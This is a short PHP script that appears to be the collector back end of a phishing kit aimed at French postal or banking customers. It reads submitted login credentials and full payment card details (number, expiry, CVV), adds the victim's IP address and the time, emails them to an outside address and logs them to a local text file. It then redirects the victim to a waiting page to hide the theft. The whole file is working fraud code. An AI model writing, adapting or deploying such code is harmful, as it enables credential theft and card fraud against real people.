<?php
$date = gmdate("H:i:s | d/m/Y");
$ip = getenv("REMOTE_ADDR");
$message .= "~~~~~~~~~~~~~~~~~ CC ~~~~~~~~~~~~~~\n\r";
$message .= "ID                    :     ".$_POST["username"]."\n\r";
$message .= "Pass                  :     ".$_POST["password"]."\n\r";
$message .= "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\r";
$message .= "Num tel               :     ".$_POST[Ntel]."\n\r";
$message .= "Numero de Carte       :     ".$_POST[Ncarte]."\n\r";
$message .= "Date Dexpiration      :     ".$_POST[Exmoth]." / ".$_POST[Exyear]."\n\r";
$message .= "Cvv                   :     ".$_POST[Cvv]."\n\r";
$message .= "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\r";
$message .= "IP                    :     $ip\n\r";
$message .= "DATE                  :     $date\n\r";
$message .= "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\r\n\r";

$send = "jaaykrimo@gmail.com";
$subject = "POSTALE $ip ";
$from .= "From: ACHRAF ";
$from .= 'MIME-Version: 1.0' . "\r\n";


@mail($send,$subject,$message,$from);

$fp = fopen('baba.txt', 'a');
fwrite($fp, $message);
fclose($fp);

?>
<SCRIPT LANGUAGE="JavaScript">
document.location.href="patientez.html"
</SCRIPT>
 